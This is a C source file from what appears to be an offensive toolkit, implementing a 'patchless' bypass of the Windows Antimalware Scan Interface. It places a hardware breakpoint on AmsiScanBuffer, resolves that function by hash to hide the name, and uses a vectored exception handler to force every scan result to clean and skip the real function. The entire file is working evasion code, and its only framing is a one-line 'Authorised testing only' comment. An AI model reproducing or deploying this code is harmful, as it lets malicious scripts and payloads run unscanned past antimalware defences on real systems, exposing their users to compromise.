/* amsi_hwbp.c -- patchless AMSI bypass via Dr0 + VEH
 *
 * Authorised testing only.
 */
#include <windows.h>
#include "veh_manager.h"
#include "helpers.h"
#include "../include/bypass.h"

static const int AMSI_DR = 0;
static BOOL g_amsi_installed = FALSE;

typedef int AMSI_RESULT_TYPE;
#define AMSI_RESULT_CLEAN_VAL 0

/* Safe pointer probe: returns TRUE if address is committed + writable. */
static BOOL writable_probe(void *p, SIZE_T n)
{
    MEMORY_BASIC_INFORMATION mbi;
    if (!VirtualQuery(p, &mbi, sizeof(mbi))) return FALSE;
    if (mbi.State != MEM_COMMIT) return FALSE;
    if (!(mbi.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE | PAGE_WRITECOPY))) return FALSE;
    return ((PBYTE)p + n) <= ((PBYTE)mbi.BaseAddress + mbi.RegionSize);
}

static LONG NTAPI amsi_handler(EXCEPTION_POINTERS *exc, PVOID target, PVOID user_ctx)
{
    (void)target; (void)user_ctx;
    CONTEXT *c = exc->ContextRecord;

    /* arg6 (result pointer) spills to [RSP+0x30] at function entry */
    PVOID *slot = (PVOID *)(c->Rsp + 0x30);
    if (writable_probe(slot, sizeof(PVOID))) {
        AMSI_RESULT_TYPE *result_ptr = (AMSI_RESULT_TYPE *)*slot;
        if (result_ptr && writable_probe(result_ptr, sizeof(AMSI_RESULT_TYPE))) {
            *result_ptr = AMSI_RESULT_CLEAN_VAL;
        }
    }

    c->Rax = 0;  /* S_OK */

    /* Pop return address, redirect */
    DWORD64 ret_addr = *(DWORD64 *)c->Rsp;
    c->Rip = ret_addr;
    c->Rsp += 8;
    return EXCEPTION_CONTINUE_EXECUTION;
}

bp_result_t bp_amsi_hwbp_install(void)
{
    if (g_amsi_installed) return BP_OK;
    HMODULE amsi = GetModuleHandleW(L"amsi.dll");
    if (!amsi) amsi = LoadLibraryW(L"amsi.dll");
    if (!amsi) return BP_ERR_AMSI_NOT_LOADED;
    PVOID amsi_scan = bp_get_proc_by_hash(amsi, bp_fnv1a("AmsiScanBuffer"));
    if (!amsi_scan) return BP_ERR_AMSI_NOT_LOADED;
    if (!bp_veh_install(AMSI_DR, amsi_scan, amsi_handler, NULL))
        return BP_ERR_SET_CONTEXT;
    g_amsi_installed = TRUE;
    return BP_OK;
}

void bp_amsi_hwbp_uninstall(void)
{
    if (!g_amsi_installed) return;
    bp_veh_uninstall(AMSI_DR);
    g_amsi_installed = FALSE;
}
